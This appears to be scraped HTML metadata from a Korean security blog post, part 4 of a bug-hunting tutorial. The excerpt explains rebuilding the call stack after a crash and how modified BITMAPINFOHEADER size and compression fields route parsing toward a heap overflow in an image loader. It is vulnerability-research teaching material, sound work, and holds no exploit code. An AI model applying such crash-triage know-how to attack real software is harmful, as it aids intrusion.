&amp;#xB418;&amp;#xC5C8;&amp;#xC73C;&amp;#xBA74; &amp;#xC88B;&amp;#xACA0;&amp;#xB124;&amp;#xC694;. &amp;#xC0AC;&amp;#xC2E4; &amp;#xC694;&amp;#xC998; &amp;#xB108;&amp;#xBB34; &amp;#xC798;&amp;#xD558;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC774; &amp;#xB9CE;&amp;#xC544;&amp;#xC11C; &amp;#xC774;&amp;#xB7F0; &amp;#xAC70; &amp;#xBCF4;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC774; &amp;#xC788;&amp;#xACA0;&amp;#xB0D0;&amp;#xB9CC;&amp;#xC740;&amp;#x2026; &amp;#xC798;&amp;#xD558;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC740; &amp;#xC774;&amp;#xAC70; &amp;#xBCF4;&amp;#xC9C0;&amp;#xB3C4; &amp;#xC54A;&amp;#xACA0;&amp;#xC9C0;&amp;#x2026; &amp;#xC96C;&amp;#xB975; &amp;#xB098;&amp;#xB3C4; &amp;#xC774;&amp;#xC81C; &amp;#xC798;&amp;#xD574;&amp;#xC57C;&amp;#xC9C0;&amp;#x2026;. &amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xADFC;&amp;#xB370; &amp;#xC77C;&amp;#xB2E8; &amp;#xC878;&amp;#xC5C5;&amp;#xBD80;&amp;#xD130; &amp;#xD558;&amp;#xC988;&amp;#xC544;&amp;#xC544;&amp;#xC544;&amp;#xC544; &amp;#x3160;&amp;#x3160;&amp;#x3160;&amp;#x3160;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC81C;&amp;#xAC00; &amp;#xC774; &amp;#xC815;&amp;#xB3C4;&amp;#xB77C;&amp;#xB3C4; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xCC44;&amp;#xCC0D;&amp;#xC9C8; &amp;#xD574;&amp;#xC900; passket, combabo, cdpython, morinori89 &amp;#xD615;&amp;#xB4E4; &amp;#xAC10;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2FC;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xD6C4;&amp;#xC6B0;&amp;#x2026;. &amp;#xC0AC;&amp;#xC2E4; &amp;#xD615;&amp;#xB4E4;&amp;#xC774;&amp;#xB791; &amp;#xC81C;&amp;#xC77C; &amp;#xB9CE;&amp;#xC774; &amp;#xD55C; &amp;#xAC70;&amp;#xB294; &amp;#xD574;&amp;#xD0B9;&amp;#xBCF4;&amp;#xB2E4;&amp;#xB294; &amp;#xC220; &amp;#xCC98;&amp;#xBA39;&amp;#xB294; &amp;#xAC70; &amp;#xAC19;&amp;#xC9C0;&amp;#xB9CC;&amp;#x2026;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xBB38;&amp;#xC11C; &amp;#xD53C;&amp;#xB4DC;&amp;#xBC31; &amp;#xC900; SSG &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4; Frozenbeer &amp;#xB561;&amp;#xD050;&amp;#xB561;&amp;#xD050; &amp;#x314B;&amp;#x314B;&amp;#x314B;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xB2E4;&amp;#xB4E4; &amp;#xC990;&amp;#xD58C;!!!&lt;/p&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research]   Part 4 - hackyboiz">
  <meta property="og:description" content="&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/&#34;&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xD29C;&amp;#xD1A0;&amp;#xB9AC;&amp;#xC5BC; Part 1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/&#34;&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xD29C;&amp;#xD1A0;&amp;#xB9AC;&amp;#xC5BC; Part 2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/&#34;&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xD29C;&amp;#xD1A0;&amp;#xB9AC;&amp;#xC5BC; Part 3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC5B4;&amp;#xB290;&amp;#xB367; &amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xD29C;&amp;#xD1A0;&amp;#xB9AC;&amp;#xC5BC;&amp;#xC758; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xAE00;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. Part 3 &amp;#xC5D0;&amp;#xC11C; &amp;#xBC14;&amp;#xB85C; &amp;#xC774;&amp;#xC5B4;&amp;#xC9C0;&amp;#xB294; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC774;&amp;#xB2C8; &amp;#xAE34;&amp;#xB9D0; &amp;#xC5C6;&amp;#xC774; &amp;#xBC14;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD574;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;!&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C;&amp;#xBD80;&amp;#xD130;&amp;#xB294; &amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD574;&amp;#xBCFC; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xBA74; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC5B4;&amp;#xB290; &amp;#xC815;&amp;#xB3C4;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBD10;&amp;#xC57C; &amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;&amp;#xAC00; &amp;#xB098;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xAC78; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &amp;#xC5B4;&amp;#xB290; &amp;#xBD80;&amp;#xBD84;&amp;#xBD80;&amp;#xD130; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA74; &amp;#xC88B;&amp;#xC744;&amp;#xC9C0;&amp;#xB97C; &amp;#xD310;&amp;#xB2E8;&amp;#xD560; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95; &amp;#xC5ED;&amp;#xC2DC; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xB85C;(&amp;#xD0D1;&amp;#xB2E4;&amp;#xC6B4;) &amp;#xC544;&amp;#xB798;&amp;#xC5D0;&amp;#xC11C; &amp;#xC704;&amp;#xB85C;(&amp;#xBC14;&amp;#xD140;&amp;#xC5C5;) &amp;#xBB58; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xD558;&amp;#xB358; &amp;#xC0C1;&amp;#xAD00;&amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB0E5; &amp;#xC790;&amp;#xC2E0;&amp;#xC774; &amp;#xD3B8;&amp;#xD558;&amp;#xC2E0; &amp;#xB300;&amp;#xB85C; &amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC14;&amp;#xD140;&amp;#xC5C5; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xD560; &amp;#xB54C;&amp;#xC5D0;&amp;#xB294; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xCC98;&amp;#xC74C; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xBE0C;&amp;#xB808;&amp;#xC774;&amp;#xD06C; &amp;#xD3EC;&amp;#xC778;&amp;#xD2B8;&amp;#xB97C; &amp;#xAC78;&amp;#xC5B4;&amp;#xC11C; &amp;#xBC14;&amp;#xB85C; &amp;#xC9C1;&amp;#xC804;&amp;#xC758; &amp;#xB9AC;&amp;#xD134; &amp;#xC5B4;&amp;#xB4DC;&amp;#xB808;&amp;#xC2A4;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xD558;&amp;#xB098;&amp;#xD558;&amp;#xB098; &amp;#xC62C;&amp;#xB77C;&amp;#xAC00;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD0D1;&amp;#xB2E4;&amp;#xC6B4; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xD560; &amp;#xACBD;&amp;#xC6B0; &amp;#xB3D9;&amp;#xC801; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xACFC; &amp;#xC815;&amp;#xC801; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xC744; &amp;#xC801;&amp;#xC808;&amp;#xD788; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC77C;&amp;#xB2E8; &amp;#xC81C;&amp;#xC77C; &amp;#xC704;(&amp;#xB77C;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;)&amp;#xC5D0; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xB294; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xBCF4;&amp;#xACE0; &amp;#xBA3C;&amp;#xC800; &amp;#xC815;&amp;#xC801; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2F1;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xACB0;&amp;#xACFC;&amp;#xB4E4;&amp;#xC744; &amp;#xAE30;&amp;#xBC18;&amp;#xC73C;&amp;#xB85C; &amp;#xB3D9;&amp;#xC801; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xC744; &amp;#xAC19;&amp;#xC774; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB098;&amp;#xB294; &amp;#xC544;&amp;#xBB34; &amp;#xC0DD;&amp;#xAC01;&amp;#xC774; &amp;#xC5C6;&amp;#xB2E4;!!! &amp;#xADF8;&amp;#xB0E5; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2F1;&amp;#xC744; &amp;#xCD5C;&amp;#xB300;&amp;#xD55C; &amp;#xC904;&amp;#xC774;&amp;#xACE0; &amp;#xC2F6;&amp;#xC5B4;&amp;#xC694;!!! &amp;#xC2DC;&amp;#xAC04;&amp;#xC740; &amp;#xB9CE;&amp;#xC544;&amp;#xC694;!!!(&amp;#xB294; &amp;#xAC1C;&amp;#xBFD4; &amp;#xC81C;&amp;#xB85C;&amp;#xB370;&amp;#xC774;&amp;#xB294; &amp;#xBB35;&amp;#xD788;&amp;#xBA74; &amp;#xB625; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;)&amp;#xB77C;&amp;#xACE0; &amp;#xD558;&amp;#xC2DC;&amp;#xB294; &amp;#xBD84;&amp;#xB4E4;&amp;#xC740; &amp;#xADF8;&amp;#xB0E5; &amp;#xC81C;&amp;#xC77C; &amp;#xC704;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; p &amp;#xB204;&amp;#xB974;&amp;#xACE0; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC; &amp;#xD130;&amp;#xC9C0;&amp;#xBA74; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8; &amp;#xC7AC;&amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xACE0; &amp;#xADF8; &amp;#xC2DC;&amp;#xC810;&amp;#xC73C;&amp;#xB85C; &amp;#xAC00;&amp;#xC11C; &amp;#xB2E4;&amp;#xC2DC; p &amp;#xB204;&amp;#xB974;&amp;#xACE0;&amp;#x2026; &amp;#xC774;&amp;#xB807;&amp;#xAC8C; &amp;#xCB49;&amp;#xCB49; &amp;#xB0B4;&amp;#xB824;&amp;#xAC00;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xB3C4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB34;&amp;#xC2DD;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xD655;&amp;#xC2E4;&amp;#xD558;&amp;#xAE30;&amp;#xB3C4; &amp;#xD558;&amp;#xC8E0;&amp;#x2026;. &amp;#xB294; &amp;#xC2DC;&amp;#xAC04; &amp;#xB0AD;&amp;#xBE44; &amp;#xAC1C;&amp;#xCA54;&amp;#x2026; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC; &amp;#xC798;&amp;#xBABB; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA74; &amp;#xB9AC;&amp;#xC5BC; &amp;#xC2DC;&amp;#xAC04; &amp;#xB0AD;&amp;#xBE44;&amp;#x2026; (&amp;#xC2A4;&amp;#xB808;&amp;#xB4DC;&amp;#xB294; &amp;#xD799;&amp;#xC744; &amp;#xACF5;&amp;#xC720;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC5EC;&amp;#xB7EC; &amp;#xAC1C;&amp;#xC758; &amp;#xC2A4;&amp;#xB798;&amp;#xB4DC;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xBA74; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC; &amp;#xB9D0;&amp;#xACE0; &amp;#xB2E4;&amp;#xB978; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;)&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xBB50; &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC774;&amp;#xAC83;&amp;#xB9CC;&amp;#xD07C; &amp;#xC0DD;&amp;#xAC01; &amp;#xC5C6;&amp;#xC774; &amp;#xD558;&amp;#xB294; &amp;#xAC74; &amp;#xC5C6;&amp;#xB294; &amp;#xAC70; &amp;#xAC19;&amp;#xB124;&amp;#xC6AC;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; (&amp;#xC9C0;&amp;#xADF9;&amp;#xD788; &amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xBCF5;&amp;#xAD6C;&amp;#xC5D0;&amp;#xB9CC; &amp;#xD574;&amp;#xB2F9;&amp;#xB418;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xACB0;&amp;#xAD6D;&amp;#xC740; &amp;#xB2E4; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xC57C; &amp;#xB3FC;&amp;#xC694; &amp;#x3160;&amp;#x3160;)&lt;/p&gt;
&lt;p&gt;&amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &amp;#xCC9C;&amp;#xCC9C;&amp;#xD788; &amp;#xB530;&amp;#xB77C;&amp;#xB2E4;&amp;#xAC00; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;ImLoader+0x27BB0&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C; &amp;#xD5E4;&amp;#xB354; &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBC1C;&amp;#xACAC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. (&amp;#xCEA1;&amp;#xCC98; &amp;#xC0AC;&amp;#xC9C4;&amp;#xC758; &amp;#xD5E5;&amp;#xC2A4;&amp;#xB808;&amp;#xC774; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xC544;&amp;#xC774;&amp;#xB2E4; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xC870;&amp;#xAE08;&amp;#xC529; &amp;#xB2E4;&amp;#xB97C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--048.png&#34; alt=&#34;bughunting-tutorials-part4/image--048.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v7&lt;/code&gt;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xAC12;&amp;#xC774; &lt;code&gt;MB&lt;/code&gt;(&amp;#xC22B;&amp;#xC790;&amp;#xB85C; &amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xC55E;&amp;#xC5D0;&amp;#xC11C; &amp;#xBABB; &amp;#xCC3E;&amp;#xC740; &amp;#xAC70;&amp;#xB124;&amp;#xC694;)&amp;#xC778;&amp;#xC9C0; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xACE0; &amp;#xD2C0;&amp;#xB9AC;&amp;#xBA74; &amp;#xC775;&amp;#xC149;&amp;#xC158;&amp;#xC744; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0A4;&amp;#xACE0; &amp;#xB9DE;&amp;#xB2E4;&amp;#xBA74; &amp;#xD574;&amp;#xC11D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7FC; &lt;code&gt;sub_427620&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xC77C; &amp;#xD574;&amp;#xC11D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xACA0;&amp;#xB124;&amp;#xC694;!!&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C;&amp;#xBD80;&amp;#xD130;&amp;#xB294; &amp;#xC2E4;&amp;#xC81C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xC9C4;&amp;#xD589;&amp;#xB418;&amp;#xB294;&amp;#xC9C0; &amp;#xC54C;&amp;#xC544;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--050.jpg&#34; alt=&#34;bughunting-tutorials-part4/image--050.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xC5B4; &amp;#xC628; Stream &amp;#xAC12;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xC758; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640;&amp;#xC11C; &amp;#xC9C0;&amp;#xC5ED;&amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7FC; &amp;#xB2F9;&amp;#xC5F0;&amp;#xD788; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC218;&amp;#xC815;&amp;#xD55C; &lt;code&gt;0x1f28&lt;/code&gt; &amp;#xC774;&amp;#xACA0;&amp;#xC8E0;? &amp;#xADF8;&amp;#xB7F0; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;0x1f28+0x40c&lt;/code&gt; &amp;#xB9CC;&amp;#xD07C; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD574;&amp;#xC8FC;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; header&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;size&lt;/code&gt; &amp;#xC640; &lt;code&gt;0xc&lt;/code&gt; &amp;#xAC00; &amp;#xAC19;&amp;#xC740; &amp;#xC9C0; &amp;#xBE44;&amp;#xAD50;&amp;#xB97C; &amp;#xD574;&amp;#xC11C; &amp;#xACB0;&amp;#xACFC; &amp;#xAC12;&amp;#xC744; &lt;code&gt;size_bool&lt;/code&gt; &amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB54C; &lt;code&gt;size&lt;/code&gt; &amp;#xB294; &lt;code&gt;0x1f28&lt;/code&gt; &amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;size_bool&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; 0 &amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xBC11;&amp;#xC5D0; &amp;#xBD84;&amp;#xAE30;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;size_bool&lt;/code&gt; &amp;#xC774; &lt;code&gt;0&lt;/code&gt; &amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;else&lt;/code&gt;&amp;#xB85C; &amp;#xBE60;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--052.png&#34; alt=&#34;bughunting-tutorials-part4/image--052.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;else&lt;/code&gt;&amp;#xB85C; &amp;#xBE60;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB418;&amp;#xBA74; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xC2DC;&amp;#xC791; &amp;#xBD80;&amp;#xBD84;&amp;#xBD80;&amp;#xD130; &lt;code&gt;size&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC640;&amp;#xC11C; header&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC55E;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;size+0x40c&lt;/code&gt; &amp;#xB9CC;&amp;#xD07C; &amp;#xD560;&amp;#xB2F9;&amp;#xC744; &amp;#xD588;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7F0; &amp;#xB2E4;&amp;#xC74C;, compression&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xBD84;&amp;#xAE30;&amp;#xBB38;&amp;#xC744; &amp;#xB9CC;&amp;#xB098;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xAC12;&amp;#xC740; &lt;code&gt;0x00&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C; &lt;code&gt;0xa00&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC218;&amp;#xC815;&amp;#xD588;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xBD84;&amp;#xAE30;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC08; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBD84;&amp;#xAE30;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA74; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8;&amp;#xB85C; &amp;#xD558;&amp;#xB294; &amp;#xC77C;&amp;#xC774; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xADF8;&amp;#xB7FC; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xAC00; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xB4B7;&amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xC774; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.(&lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xAC00; &amp;#xD398;&amp;#xC774;&amp;#xC9C0;&amp;#xB97C; &amp;#xD558;&amp;#xB098; &amp;#xB354; &amp;#xD560;&amp;#xB2F9;&amp;#xD560; &amp;#xB9CC;&amp;#xD07C; &amp;#xD06C;&amp;#xC9C8; &amp;#xC54A;&amp;#xC73C;&amp;#xB2C8;) &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC911;&amp;#xC694;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;!!! &amp;#xC65C;&amp;#xB0D0;&amp;#xD558;&amp;#xBA74; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xB36E;&amp;#xAC8C; &amp;#xB420; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB2C8;&amp;#xAE4C;&amp;#xC694; &amp;#x314E;&amp;#x314E;(&amp;#xC751;? 